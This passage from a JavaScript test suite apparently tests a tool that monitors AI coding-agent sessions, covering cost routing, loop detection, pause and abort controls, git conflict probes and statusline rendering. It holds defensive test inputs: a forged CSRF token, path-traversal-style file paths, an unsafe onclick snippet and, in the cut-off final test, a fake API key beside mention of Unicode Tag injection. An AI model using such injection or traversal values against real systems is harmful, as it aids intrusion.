    // Case A: Productive reasoning (high thinking tokens, mutating edits, changing hypotheses)
    const productiveTurns = [
      { hypothesis: 'Initial CORS hypothesis', outcome: 'failed', mutatingCalls: 1 },
      { hypothesis: 'Revised JWT header hypothesis', outcome: 'failed', mutatingCalls: 2 }
    ];
    const prodDrift = classifyTurnDrift({ thinkingTokens: 8000, visibleOutputTokens: 1200, mutatingCalls: 2 });
    assert.equal(prodDrift, 'elevated');
    const prodLoop = auditHypothesisLoop(productiveTurns);
    assert.equal(prodLoop.isLoop, false);
    const prodEval = evaluateSemanticDrift({ recentTurns: productiveTurns, flightMode: 'COACH' });
    assert.equal(prodEval.triggered, false);
    assert.equal(prodEval.decision, 'allow');

    // Case B: Degraded loop (high thinking tokens, 0 edits, repeating hypothesis)
    const degradedTurns = [
      { hypothesis: 'Deadlock in mutex', outcome: 'failed', mutatingCalls: 0 },
      { hypothesis: 'Deadlock in mutex', outcome: 'failed', mutatingCalls: 0 },
      { hypothesis: 'Deadlock in mutex', outcome: 'failed', mutatingCalls: 0 }
    ];
    const degDrift = classifyTurnDrift({ thinkingTokens: 8000, visibleOutputTokens: 80, mutatingCalls: 0 });
    assert.equal(degDrift, 'loop_suspect');
    const degLoop = auditHypothesisLoop(degradedTurns);
    assert.equal(degLoop.isLoop, true);
    const degEval = evaluateSemanticDrift({ recentTurns: degradedTurns, flightMode: 'COACH' });
    assert.equal(degEval.triggered, true);
    assert.equal(degEval.decision, 'warn');
  });

  // Test 3.18: Feature 18 ↔ Feature 19
  it('3.18 Pairwise: Retention radar grade A warm cache blocks algebraic C* model downshift', () => {
    const cStar = calculateBreakEvenCStar();
    assert.equal(cStar, 6522);

    // Warm cache (25,000 tokens cached > C*): Staying on Opus is cheaper due to 90% cache discount
    const evalWarm = computeBreakEvenCachedTokens({
      currentModel: 'claude-opus-5-5',
      targetModel: 'claude-sonnet-5-5',
      expectedOutputTokens: 1500,
      cachedTokens: 25000,
      cacheWarm: true
    });
    assert.ok(evalWarm.stayOnCurrentModelUSD < evalWarm.switchToTargetModelUSD);
    const penaltyUSD = evalWarm.switchToTargetModelUSD - evalWarm.stayOnCurrentModelUSD;
    assert.ok(penaltyUSD > 0);

    // Cold cache (cache bust, 0 cached tokens): Sonnet switch is cheaper
    const evalCold = computeBreakEvenCachedTokens({
      currentModel: 'claude-opus-5-5',
      targetModel: 'claude-sonnet-5-5',
      expectedOutputTokens: 1500,
      cachedTokens: 0,
      cacheWarm: false
    });
    assert.ok(evalCold.switchToTargetModelUSD < evalCold.stayOnCurrentModelUSD);
  });

  // Test 3.19: Feature 19 ↔ Feature 18
  it('3.19 Pairwise: Algebraic C* router releases warm cache lock upon prompt prefix file mutation', () => {
    assert.equal(isPrefixInstructionFile('AGENTS.md'), true);
    assert.equal(isPrefixInstructionFile('src/core/router.mjs'), false);

    const blockOrig = 'Rules: Keep invariants locked.';
    const blockMut = 'Rules: Invariants altered mid-session.';
    assert.notEqual(fnv1a64Hex(blockOrig), fnv1a64Hex(blockMut));

    // When cache bust occurs, warm cache lock is released
    const evalAfterBust = computeBreakEvenCachedTokens({
      currentModel: 'claude-opus-5-5',
      targetModel: 'claude-sonnet-5-5',
      expectedOutputTokens: 1500,
      cachedTokens: 0,
      cacheWarm: false
    });
    assert.ok(evalAfterBust.switchToTargetModelUSD < evalAfterBust.stayOnCurrentModelUSD);

    // Custom price break-even: Opus 4.6 to Sonnet 4.6
    assert.equal(calculateBreakEvenCStar({ currentModel: 'claude-opus-4-6', targetModel: 'claude-sonnet-4-6' }), 4615);
  });

  // Test 3.20: Feature 20 ↔ Feature 21
  it('3.20 Pairwise: Haiku 100k cliff breaker trips during dual-TTL countdown and decrements cache TTL cleanly', () => {
    // 98.5k tokens on Haiku trips circuit breaker
    const breaker = checkHaiku100kCliffBreaker('claude-haiku-5-5', 98500);
    assert.equal(breaker.triggered, true);
    assert.equal(breaker.action, 'warn');

    const rawDet12 = evaluateDet12HaikuPreCliffBreaker({ modelId: 'claude-haiku-5-5', totalInputTokens: 98500 });
    assert.equal(rawDet12.triggered, true);
    assert.equal(rawDet12.decision, 'deny');

    // Dual-TTL countdown during compaction hold
    const now = 1000000;
    const ttlDuringHold = calculateDualTtlCountdown(now - 120000, now);
    assert.equal(ttlDuringHold.cacheTtlSec, 180);
    assert.equal(ttlDuringHold.formattedCacheTtl, '03:00');
    assert.equal(ttlDuringHold.isCacheExpired, false);

    // Cache expiration after 5m idle
    const ttlExpired = calculateDualTtlCountdown(now - 350000, now);
    assert.equal(ttlExpired.cacheTtlSec, 0);
    assert.equal(ttlExpired.isCacheExpired, true);
    assert.equal(ttlExpired.formattedCacheTtl, '00:00');
  });

  // Test 3.21: Feature 21 ↔ Feature 22
  it('3.21 Pairwise: Dual-TTL countdown synchronizes rolling 1h TTL with 5-hour billing block rollovers', () => {
    const t0 = 1000000;
    const fiveHoursMs = 5 * 3600 * 1000;
    const events = [
      { timestamp: t0, costUsd: 10.0, tokens: 200000, subagentId: 'worker-1' },
      { timestamp: t0 + (2 * 3600 * 1000), costUsd: 15.0, tokens: 300000, subagentId: 'worker-2' },
      { timestamp: t0 + fiveHoursMs + 1000, costUsd: 5.0, tokens: 100000, subagentId: 'worker-1' }
    ];

    const blocks = partitionBillingBlocks(events);
    assert.equal(blocks.length, 2);
    assert.equal(blocks[0].blockIndex, 0);
    assert.equal(blocks[0].totalCostUsd, 25.0);
    assert.equal(blocks[0].burnRateUsdPerHour, 5.0);

    // Intra-hour rolling TTL at t0 + 5.5 hours
    const now = t0 + (5.5 * 3600 * 1000);
    const ttl = calculateDualTtlCountdown(t0, now, 300000, 3600000, { rolling: true });
    assert.equal(ttl.formattedBillingTtl, '30:00');
    assert.equal(ttl.isBillingExpired, true);
  });

  // Test 3.22: Feature 22 ↔ Feature 21
  it('3.22 Pairwise: High-velocity spend in 5-hour billing block tracks active cache TTL resets per worker stream', () => {
    const t0 = 1000000;
    const events = [
      { timestamp: t0 + 100, costUsd: 8.0, tokens: 100000, subagentId: 'worker-1' },
      { timestamp: t0 + 200, costUsd: 12.0, tokens: 150000, subagentId: 'worker-2' },
      { timestamp: t0 + 300, costUsd: 5.0, tokens: 50000, subagentId: 'coordinator' }
    ];

    const [block] = partitionBillingBlocks(events);
    assert.equal(block.subagentSpend['worker-1'], 8.0);
    assert.equal(block.subagentSpend['worker-2'], 12.0);
    assert.equal(block.subagentSpend['coordinator'], 5.0);
    assert.equal(block.totalCostUsd, 25.0);

    // Active worker turn refreshes cache TTL to full 300s
    const activeTtl = calculateDualTtlCountdown(t0 + 300, t0 + 300);
    assert.equal(activeTtl.cacheTtlSec, 300);
    assert.equal(activeTtl.formattedCacheTtl, '05:00');

    // Idle worker stream expires without corrupting block
    const idleTtl = calculateDualTtlCountdown(t0, t0 + 400000);
    assert.equal(idleTtl.isCacheExpired, true);
  });

  // Test 3.23: Feature 23 ↔ Feature 32
  it('3.23 Pairwise: Retention sparklines and metrics embed cleanly into responsive ANSI statusline without column overflow', () => {
    const deltas = [1000, 2500, 4000, 8000, 12000];
    const sparkline = buildTurnVelocitySparkline(deltas, 5);
    assert.equal(sparkline.length, 5);

    const svg = renderRetentionStepChart({ measured: true, series: [{ pct: 95, bust: false }] });
    assert.ok(svg.includes('<svg'));
    assert.equal(svg.includes('<script>'), false);

    // Verify visible column constraints across 80, 110, and 144 columns
    const st80 = renderStatusLine({ flightMode: 'COACH' }, { maxCols: 80, columns: 80 });
    assert.ok(st80.plainLine.length <= 80);
    assert.ok(st80.visibleLength <= 80);

    const st110 = renderStatusLine({ flightMode: 'COACH' }, { maxCols: 110, columns: 110 });
    assert.ok(st110.plainLine.length <= 110);
    assert.ok(st110.visibleLength <= 110);

    const st144 = renderStatusLine({ flightMode: 'COACH' }, { maxCols: 144, columns: 144 });
    assert.ok(st144.plainLine.length <= 144);
    assert.ok(st144.visibleLength <= 144);

    // Non-color mode strips all ANSI escapes
    const stNoColor = renderStatusLine({ flightMode: 'COACH' }, { maxCols: 80, columns: 80, ansi: false });
    assert.ok(stNoColor.line.length <= 80);
    assert.equal(stNoColor.line.includes('\x1b['), false);
  });

  // Test 3.24: Feature 24 ↔ Feature 6
  it('3.24 Pairwise: Hierarchical execution call-tree spans validate and round-trip through USTF v1 trajectory format', () => {
    const traj = createMockUSTFTrajectory({ turnsCount: 1, harness: 'antigravity' });
    const rootTool = createMockToolSpan({ toolName: 'invoke_subagent', startMs: 1000, durationMs: 120 });
    const childTool = createMockToolSpan({ toolName: 'read_file', startMs: 1020, durationMs: 40 });
    traj.turns[0].toolSpans = [rootTool, childTool];

    const val = validateUSTFv1(traj);
    assert.equal(val.valid, true);

    const serialized = serializeUSTFv1(traj);
    const deserialized = deserializeUSTFv1(serialized);
    assert.equal(deserialized.turns.length, 1);
    assert.equal(deserialized.turns[0].toolSpans.length, 2);
    assert.equal(deserialized.turns[0].toolSpans[0].toolName, 'invoke_subagent');
    assert.equal(deserialized.turns[0].toolSpans[1].toolName, 'read_file');
  });

  // Test 3.25: Feature 25 ↔ Feature 14
  it('3.25 Pairwise: DET-31 non-destructive git merge conflict sensor detects worktree branch collisions in <12ms', () => {
    const ws = createTempWorkspace({ prefix: 'ctxtop-p25-conflict-' });
    try {
      execFileSync('git', ['init'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.name', 'Test'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'user.email', 'test@example.com'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['config', 'gc.auto', '0'], { cwd: ws.wsDir, stdio: 'ignore' });

      // Create initial common ancestor commit
      ws.writeFile('auth_service.js', 'module.exports = { role: "base", scope: "public" };\n');
      execFileSync('git', ['add', '.'], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['commit', '-m', 'root commit'], { cwd: ws.wsDir, stdio: 'ignore' });
      const defaultBranch = execFileSync('git', ['branch', '--show-current'], { cwd: ws.wsDir, encoding: 'utf8' }).trim() || 'master';

      // Branch 1: worker-auth introduces divergent update
      execFileSync('git', ['checkout', '-b', 'feat/auth'], { cwd: ws.wsDir, stdio: 'ignore' });
      ws.writeFile('auth_service.js', 'module.exports = { role: "worker-auth", scope: "internal" };\n');
      execFileSync('git', ['commit', '-am', 'worker-auth updates auth_service'], { cwd: ws.wsDir, stdio: 'ignore' });

      // Branch 2: worker-billing introduces conflicting update
      execFileSync('git', ['checkout', defaultBranch], { cwd: ws.wsDir, stdio: 'ignore' });
      execFileSync('git', ['checkout', '-b', 'feat/billing'], { cwd: ws.wsDir, stdio: 'ignore' });
      ws.writeFile('auth_service.js', 'module.exports = { role: "worker-billing", scope: "restricted" };\n');
      execFileSync('git', ['commit', '-am', 'worker-billing conflicting update'], { cwd: ws.wsDir, stdio: 'ignore' });

      // Feature 14: Swarm roster state correlates with active subagent branch worktrees
      const state = {
        subagents: {
          'worker-auth': { agentId: 'worker-auth', worktree: ws.wsDir, branch: 'feat/auth', lastActiveAt: Date.now() },
          'worker-billing': { agentId: 'worker-billing', worktree: ws.wsDir, branch: 'feat/billing', lastActiveAt: Date.now() }
        }
      };
      const summary = computeSwarmSummary(state);
      assert.equal(summary.workers.length, 2);
      assert.equal(summary.live, 2);

      // Feature 25: DET-31 probe detects merge conflict across subagent branches non-destructively
      const probe = probeGitMergeTree('feat/auth', 'feat/billing', { workspaceDir: ws.wsDir });
      assert.equal(probe.clean, false);
      assert.equal(probe.hasConflict, true);
      assert.ok(probe.conflictFiles.some(f => f.includes('auth_service.js')));
      assert.ok(probe.conflictMessages.length >= 1);
      assert.ok(probe.latencyMs >= 0);

      // Verify latency SLA (<12ms on POSIX, sub-150ms on Windows due to process spawn)
      const maxLatencyMs = process.platform === 'win32' ? 150 : 12;
      assert.ok(probe.latencyMs < maxLatencyMs, `Probe latency (${probe.latencyMs}ms) should meet performance threshold`);

      // Verify non-destructive invariant: working tree and index remain 100% clean
      const statusOut = execFileSync('git', ['status', '--porcelain'], { cwd: ws.wsDir, encoding: 'utf8' });
      assert.equal(statusOut.trim(), '', 'Workspace must remain clean after merge-tree probe');

      // Baseline clean check: self-merge produces zero conflicts
      const cleanProbe = probeGitMergeTree('feat/auth', 'feat/auth', { workspaceDir: ws.wsDir });
      assert.equal(cleanProbe.clean, true);
      assert.equal(cleanProbe.hasConflict, false);
      assert.deepEqual(cleanProbe.conflictFiles, []);
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.26: Feature 26 ↔ Feature 27
  it('3.26 Pairwise: User /pause command latched into control state machine overrides autonomous COACH findings', () => {
    let state = createInitialControlState('session-latch-test');
    state = transitionControlState(state, 'pause', 'User pause requested');
    assert.equal(state.state, CONTROL_STATES.PAUSED);

    // User pause takes strict precedence in COACH mode
    const coachRes = evaluateCoachLatch({
      controlState: state,
      flightMode: 'COACH',
      detectorVerdict: { triggered: true, detectorId: 'DET-09', reason: 'Warm cache rule mutation' }
    });
    assert.equal(coachRes.decision, 'suspend');
    assert.equal(coachRes.userCommand, true);

    // Resuming restores advisory evaluation
    state = transitionControlState(state, 'resume');
    assert.equal(state.state, CONTROL_STATES.RUNNING);
    const resumeRes = evaluateCoachLatch({
      controlState: state,
      flightMode: 'COACH',
      detectorVerdict: { triggered: true, detectorId: 'DET-09', reason: 'Warm cache rule mutation' }
    });
    assert.equal(resumeRes.decision, 'allow');
    assert.equal(resumeRes.advisory, true);
  });

  // Test 3.27: Feature 27 ↔ Feature 26
  it('3.27 Pairwise: COACH mode stepping executes exactly one tool call before re-pausing and respects terminal abort', () => {
    let state = createInitialControlState('session-step-test');
    state = transitionControlState(state, 'pause');
    state = transitionControlState(state, 'step', 'Execute single tool');
    assert.equal(state.state, CONTROL_STATES.STEP);
    assert.equal(state.stepRemaining, 1);

    // Single step allowed
    const latchStep = evaluateToolBoundaryLatch(state);
    assert.equal(latchStep.decision, 'allow');
    assert.equal(latchStep.consumeStep, true);

    // Step consumed -> returns to PAUSED
    state = transitionControlState(state, 'consume_step');
    assert.equal(state.state, CONTROL_STATES.PAUSED);
    assert.equal(evaluateToolBoundaryLatch(state).decision, 'suspend');

    // Terminal abort is irreversible
    state = transitionControlState(state, 'abort', 'User abort');
    assert.equal(state.state, CONTROL_STATES.ABORTED);
    assert.equal(evaluateToolBoundaryLatch(state).decision, 'deny');

    state = transitionControlState(state, 'resume');
    assert.equal(state.state, CONTROL_STATES.ABORTED);
  });

  // Test 3.28: Feature 28 ↔ Feature 29
  it('3.28 Pairwise: Atomic tool-boundary suspension suspends non-spinning over warm Micro-IPC and resumes on transition', async () => {
    const pipePath = getPlatformPipePath('pairwise-28-29');
    const server = new MicroIpcServer({ ipcPath: pipePath });
    await server.listen();

    try {
      const client = new MicroIpcClient({ ipcPath: pipePath, connectTimeoutMs: 2000, requestTimeoutMs: 2000 });
      assert.equal(await client.ping(2000), true);

      // 1. Transition server session to PAUSED
      await client.call('control.transition', { sessionId: 's-ipc', action: 'pause', reason: 'Manual pause' });

      // 2. PreToolUse enters non-spinning suspension
      let resolvedResult = null;
      const hookPromise = client.call('hook.preToolUse', { sessionId: 's-ipc', tool: 'Bash', command: 'ls' })
        .then(res => { resolvedResult = res; return res; });

      await new Promise(r => setTimeout(r, 60));
      assert.equal(resolvedResult, null, 'Must remain suspended without returning');

      // 3. Second client issues resume transition
      const client2 = new MicroIpcClient({ ipcPath: pipePath, requestTimeoutMs: 2000 });
      await client2.call('control.transition', { sessionId: 's-ipc', action: 'resume' });

      // 4. Suspended hook resolves immediately with allow
      const res = await hookPromise;
      assert.equal(res.decision, 'allow');

      await client.close();
      await client2.close();
    } finally {
      await server.close();
    }
  });

});

// ============================================================================
// Group 3: Features 29 through 41 Pairwise Interactions (Tests 3.29 - 3.41)
// ============================================================================
describe('Tier 3: Pairwise Interactions (Features 29 - 41)', () => {

  // Test 3.29: Feature 29 ↔ Feature 30
  it('3.29 Pairwise: Warm Micro-IPC Bridge falls back seamlessly to CLI runner when daemon crashes mid-operation', async () => {
    const pipePath = getPlatformPipePath('tier3-f29-f30');
    let server = await startMockIpcServer({
      pipePath,
      responseHandler: (req) => ({
        jsonrpc: '2.0',
        id: req.id,
        result: { exitCode: 0, stdout: '', stderr: '', verdict: { triggered: false, source: 'ipc' } }
      })
    });

    try {
      // 1. Initial warm IPC request succeeds
      const t0 = performance.now();
      const res1 = await sendIpcMessage(pipePath, {
        jsonrpc: '2.0',
        id: 1,
        method: 'hook.preToolUse',
        params: { toolName: 'Bash', command: 'node -v' }
      });
      const latency1 = performance.now() - t0;

      assert.equal(res1.result.exitCode, 0);
      assert.equal(res1.result.verdict.source, 'ipc');
      assert.ok(latency1 < 50.0, `Warm IPC latency ${latency1}ms exceeds SLA`);

      // 2. Abrupt daemon crash / server socket shutdown
      await server.close();
      server = null;

      // 3. Next hook request encounters offline daemon; falls back cleanly to CLI runner
      let stderrCaptured = '';
      const origStderr = process.stderr.write;
      process.stderr.write = (chunk) => {
        stderrCaptured += String(chunk);
        return true;
      };

      try {
        const t1 = performance.now();
        const res2 = await simulateCliFallback(
          pipePath,
          () => runPreToolUseHook({ toolName: 'Read', toolInput: { file_path: 'package.json' } }),
          { timeoutMs: 15 }
        );
        const latency2 = performance.now() - t1;

        assert.equal(res2.fallbackTriggered, true);
        assert.equal(res2.result.exitCode, 0);
        assert.equal(stderrCaptured, '', 'Must not print unhandled socket errors to stderr');
        assert.ok(latency2 < 50.0, `Fallback latency ${latency2}ms must execute instantly`);
      } finally {
        process.stderr.write = origStderr;
      }
    } finally {
      if (server) await server.close();
    }
  });

  // Test 3.30: Feature 30 ↔ Feature 29
  it('3.30 Pairwise: Standalone CLI Hook Fallback executes offline and reconnects automatically to warm IPC upon daemon boot', async () => {
    const pipePath = getPlatformPipePath('tier3-f30-f29-recov');

    // 1. Initial invocation when daemon is completely offline
    const resOffline = await simulateCliFallback(
      pipePath,
      () => runPostToolUseHook({ toolName: 'Write', toolInput: { path: 'test.log', content: 'offline' } }),
      { timeoutMs: 15 }
    );
    assert.equal(resOffline.fallbackTriggered, true);
    assert.equal(resOffline.result.exitCode, 0);

    // 2. Daemon boots up on the pipe path
    const server = await startMockIpcServer({
      pipePath,
      responseHandler: (req) => ({
        jsonrpc: '2.0',
        id: req.id,
        result: { exitCode: 0, stdout: '', stderr: '', source: 'warm-ipc-recovered' }
      })
    });

    try {
      // 3. Next invocation through warm IPC reconnects automatically
      const resOnline = await sendIpcMessage(pipePath, {
        jsonrpc: '2.0',
        id: 2,
        method: 'hook.postToolUse',
        params: { toolName: 'Write', toolInput: { path: 'test.log', content: 'online' } }
      });
      assert.equal(resOnline.result.source, 'warm-ipc-recovered');
    } finally {
      await server.close();
    }
  });

  // Test 3.31: Feature 31 ↔ Feature 32
  it('3.31 Pairwise: Unified ctxtop CLI dispatches statusline across 80/110/144 columns with atomic snapshot update', async () => {
    const ws = createTempWorkspace({ prefix: 'pw-cli-status-' });
    try {
      // CLI demo mode execution
      const demoRes = await runCli(['statusline', '--demo']);
      assert.ok(demoRes);
      assert.ok(demoRes.line.includes('AH ['));

      // Exercise programmatic statusline bridge across columns
      const dummyPayload = {
        sessionId: 'pw-session-31-32',
        flightMode: 'COACH',
        totalInputTokens: 72000,
        cachedTokens: 60000
      };

      const res80 = executeStatusLineBridge(dummyPayload, { columns: 80, cwd: ws.wsDir });
      assert.equal(res80.layoutTier, 'compact-80');
      assert.ok(res80.visibleLength <= 80);
      assert.ok(!res80.line.includes('\n'));

      const res110 = executeStatusLineBridge(dummyPayload, { columns: 110, cwd: ws.wsDir });
      assert.equal(res110.layoutTier, 'standard-110');
      assert.ok(res110.visibleLength <= 110);

      const res144 = executeStatusLineBridge(dummyPayload, { columns: 144, cwd: ws.wsDir });
      assert.equal(res144.layoutTier, 'wide-144');
      assert.ok(res144.visibleLength <= 144);

      // Verify NO_COLOR / ansi: false mode
      const resNoAnsi = executeStatusLineBridge(dummyPayload, { columns: 110, ansi: false, cwd: ws.wsDir });
      assert.equal(resNoAnsi.line.includes('\x1b['), false);
      assert.equal(resNoAnsi.line, resNoAnsi.plainLine);

      // Verify atomic disk state persistence
      assert.ok(fs.existsSync(res80.sessionPath));
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.32: Feature 32 ↔ Feature 33
  it('3.32 Pairwise: Zero-Flicker StatusLine synchronizes 40-cell proportional grid with AbovePrompt HUD in wide layout', () => {
    const state = {
      modelId: 'claude-sonnet-5-5',
      flightMode: 'COACH',
      contextCeiling: 200000,
      totalInputTokens: 140000,
      systemAndMcpTokens: 25000,
      cachedTokens: 75000,
      distractorTokens: 20000,
      lastWriteTokens: 20000,
      promptCache: { warm: true, ttlSeconds: 240 }
    };

    // 1. Compute AbovePrompt HUD
    const grid = computeHorizonGrid(state);
    assert.equal(grid.cellCount, 40);
    const sumCells = grid.cellCounts.S + grid.cellCounts.C + grid.cellCounts.D + grid.cellCounts.W + grid.cellCounts.empty;
    assert.equal(sumCells, 40);

    const hudBand = renderAbovePromptBand(state, { columns: 144, ansi: true });
    assert.ok(hudBand.plainLine.includes('[COACH'));

    // 2. Compute StatusLine in wide-144 mode
    const statusLine = renderStatusLine(state, { columns: 144, ansi: true });
    assert.equal(statusLine.layoutTier, 'wide-144');
    assert.ok(statusLine.visibleLength <= 144);

    // 3. Verify bucket proportionality parity across HUD and StatusLine
    assert.ok(statusLine.plainLine.includes('sonnet-5-5'));
    assert.ok(statusLine.plainLine.includes('COACH'));
    assert.ok(statusLine.plainLine.includes('Cache'));
  });

  // Test 3.33: Feature 33 ↔ Feature 32
  it('3.33 Pairwise: AbovePrompt 40-Cell HUD dynamic token shifts and circuit breaker triggers reflect in StatusLine', () => {
    const stressedState = {
      modelId: 'claude-haiku-4-5',
      flightMode: 'COACH',
      contextCeiling: 200000,
      totalInputTokens: 98500,
      cachedTokens: 80000,
      promptCache: { warm: true, ttlSeconds: 45 }
    };

    const breakerVerdict = { triggered: true, detectorId: 'DET-12', ruleId: 'HAIKU_CLIFF' };

    // AbovePrompt reflects breaker
    const hud = renderAbovePromptBand(stressedState, { breakerVerdict });
    assert.ok(hud.coachPill.includes('DET-12') || hud.plainLine.includes('DET-12'));

    // StatusLine reflects breaker
    const status = renderStatusLine(stressedState, { breakerVerdict, columns: 110 });
    assert.ok(status.line.includes('DET-12') || status.plainLine.includes('DET-12'));
    assert.ok(status.visibleLength <= 110);
    assert.ok(!status.line.includes('\n'));
  });

  // Test 3.34: Feature 34 ↔ Feature 35
  it('3.34 Pairwise: Docked Claude /horizon Pane telemetry metrics match Antigravity Studio Artifact SVG attributes', () => {
    const ws = createTempWorkspace({ prefix: 'pw-pane-studio-' });
    try {
      const telemetry = {
        modelId: 'claude-sonnet-5-5',
        flightMode: 'COACH',
        totalInputTokens: 85000,
        cachedTokens: 75000,
        promptCache: { warm: true, ttlSeconds: 210 },
        retention: {
          measured: true,
          retentionIndexPct: 94,
          grade: 'A',
          retainedDiscountSavingsUSD: 3.42,
          leakedColdPrefillUSD: 0.18,
          measuredTurns: 8,
          bustCount: 0,
          ttlExpiredTurns: 0,
          series: [{ pct: 94, bust: false }]
        }
      };

      // 1. Render Claude docked pane
      const pane = renderSimpleViewPane(telemetry, { viewMode: 'SIMPLE_4_RANK' });
      assert.equal(pane.ranks.length, 4);
      assert.ok(pane.ranks[0].text.includes('claude-sonnet-5-5'));

      // 2. Render Antigravity Studio Artifact
      const html = renderCostRadarHtml({
        retention: telemetry.retention,
        meta: { sessionTitle: 'Cross-Host Parity Verification', model: telemetry.modelId }
      });
      const artifactPath = ws.writeFile('cost_radar.html', html);
      const fileUri = `file:///${path.resolve(artifactPath).replace(/\\/g, '/').replace(/^\/+/, '')}`;
      const embedTag = `<agent-embed src="${fileUri}"></agent-embed>`;

      // 3. Verify cross-host metric parity
      assert.ok(html.includes('saved $3.42') || html.includes('3.42'));
      assert.ok(html.includes('94% retained') || html.includes('94%'));
      assert.ok(embedTag.startsWith('<agent-embed src="file:///'));
      assert.ok(!html.includes('http://') && !html.includes('https://'));
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.35: Feature 35 ↔ Feature 34
  it('3.35 Pairwise: Antigravity Studio Artifact validates CSRF tokens and falls back to docked pane layout in headless mode', () => {
    // 1. Verify CSRF authentication
    assert.equal(isValidCsrfToken(HORIZON_CSRF_TOKEN), true);
    assert.equal(isValidCsrfToken('malicious-forged-csrf-token'), false);

    // 2. Verify headless fallback layout
    const dummyState = {
      modelId: 'claude-sonnet-5-5',
      flightMode: 'COACH',
      contextWindow: { totalInputTokens: 60000, cachedTokens: 50000 }
    };
    const advancedPane = renderAdvancedViewPane(dummyState);
    assert.ok(advancedPane.text.includes('[Section 1]'));
    assert.ok(!advancedPane.text.includes('Upgrade now'));
    assert.ok(!advancedPane.text.includes('Sponsor'));
  });

  // Test 3.36: Feature 36 ↔ Feature 37
  it('3.36 Pairwise: Plain-Text /compact Invariant and Active Source Protection co-exist in compaction recommendations', () => {
    // 1. Active source files protected from ignore action
    assert.equal(isIgnorablePath('src/core/router.mjs'), false);
    assert.equal(isIgnorablePath('src/webview/horizon_panel.html'), false);

    // 2. Lockfiles and build artifacts eligible for ignore action
    assert.equal(isIgnorablePath('package-lock.json'), true);
    assert.equal(isIgnorablePath('build/output.log'), true);

    // 3. UI snippet synthesizing compaction offender list
    const candidateFiles = ['src/core/router.mjs', 'package-lock.json'];
    const renderedIgnoreButtons = candidateFiles.filter(isIgnorablePath);
    assert.deepEqual(renderedIgnoreButtons, ['package-lock.json']);

    // 4. Compaction container strictly maintains plain-text invariant
    const uiSnippet = [
      '<div id="compactInstruction">Type /compact in the chat box and press Enter</div>',
      '<div id="compactReclaim">Estimated savings: 45,000 tokens</div>',
      ...renderedIgnoreButtons.map((f) => `<button class="btn-ignore" data-file="${f}">Ignore</button>`)
    ].join('\n');

    assert.doesNotThrow(() => assertPlainTextCompact(uiSnippet));
    assert.ok(!uiSnippet.includes('src/core/router.mjs</button>'));
  });

  // Test 3.37: Feature 37 ↔ Feature 36
  it('3.37 Pairwise: Active Source Protection blocks adversarial path injection while preserving plain-text /compact', () => {
    const adversarialPaths = [
      'src/components/btnCompactPrimary.js',
      'src/utils/output_logger.ts',
      '../../src/core/classifier.mjs'
    ];

    for (const p of adversarialPaths) {
      assert.equal(isIgnorablePath(p), false, `Path ${p} must be recognized as active source`);
    }

    const validSnippet = '<div id="compactInstruction">Type /compact in the chat box and press Enter</div><button id="btnCompactPrimary">Copy /compact</button>';
    assert.doesNotThrow(() => assertPlainTextCompact(validSnippet));
    const badSnippet = '<div id="compactInstruction"><button onclick="copyCompactWithGuidance()">Copy</button></div>';
    assert.throws(() => assertPlainTextCompact(badSnippet), /Invariant 1 Violation/);
  });

  // Test 3.38: Feature 38 ↔ Feature 39
  it('3.38 Pairwise: Mirror Parity verification executes complete SHA-256 comparison with zero outbound socket egress', async () => {
    const ws = createTempWorkspace({ prefix: 'pw-mirror-net-' });
    try {
      const pairs = [
        [ws.writeFile('pluginA/core.mjs', 'export const v = 4;'), ws.writeFile('pluginB/core.mjs', 'export const v = 4;')],
        [ws.writeFile('pluginA/panel.html', '<div>Panel</div>'), ws.writeFile('pluginB/panel.html', '<div>Panel</div>')]
      ];

      const { result, violations } = await withNetworkSpy(async () => {
        return assertMirrorParity({ filePairs: pairs });
      });

      assert.equal(violations.length, 0, 'Mirror verification must make 0 external network requests');
      assert.equal(result.verifiedPairs, 2);
      assert.equal(result.mismatches.length, 0);

      // Verify source scripts contain zero forbidden network calls
      assert.doesNotThrow(() => assertNoOutboundEgress(fs.readFileSync('scripts/sync_mirrors.mjs', 'utf8')));
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.39: Feature 39 ↔ Feature 10
  it('3.39 Pairwise: Zero-Trust Read-Only SQLite queries and FTS5 searches execute with zero outbound socket connections', async () => {
    const sqliteReady = await isSqliteAvailable();
    const ws = createTempWorkspace({ prefix: 'pw-ro-net-' });

    try {
      if (sqliteReady) {
        const fixture = await createMockDatabaseFixture(path.join(ws.wsDir, 'audit_db'), {
          tables: {
            turns: 'turn_id INTEGER PRIMARY KEY, prompt TEXT, tokens INTEGER'
          },
          records: [
            { __table: 'turns', __values: { turn_id: 1, prompt: 'Initialize horizon monitoring', tokens: 1200 } },
            { __table: 'turns', __values: { turn_id: 2, prompt: 'Refactor classifier logic', tokens: 2500 } }
          ]
        });

        const { violations } = await withNetworkSpy(async () => {
          const db = new SqliteDatabaseSyncWrapper(fixture.dbPath, { readOnly: true });
          try {
            const count = db.get('SELECT COUNT(*) AS count FROM turns');
            assert.equal(count.count, 2);

            // Mutating SQL must throw Zero-Trust SQLite Guard error
            assert.throws(
              () => db.get("INSERT INTO turns VALUES (3, 'leak', 100)"),
              /Zero-Trust SQLite Guard/
            );
          } finally {
            db.close();
          }
        });

        assert.equal(violations.length, 0, 'SQLite queries must execute strictly local without network egress');
      } else {
        // Node 20 JSONL Fallback path
        const jsonlPath = ws.writeFile('session.jsonl', '{"turn":1,"tokens":1200}\n{"turn":2,"tokens":2500}\n');
        const { violations } = await withNetworkSpy(async () => {
          const content = fs.readFileSync(jsonlPath, 'utf8');
          assert.ok(content.includes('1200'));
        });
        assert.equal(violations.length, 0);
      }
    } finally {
      ws.cleanup();
    }
  });

  // Test 3.40: Feature 40 ↔ Feature 15
  it('3.40 Pairwise: Zero-PII Airlock sanitizes Unicode Tag injection and API keys before DET-32 semantic drift evaluation', () => {
    const lockedInvariants = [
      'Always use pnpm instead of npm',
      'Never delete active source files'
    ];

    // Adversarial turn payload with injected Unicode Tags and leaked Anthropic API key
    const rawAdversarialTurn = [
      'I will proceed with the update.',
      'Key: sk-ant-api03-secretkey1234567890abcdef',
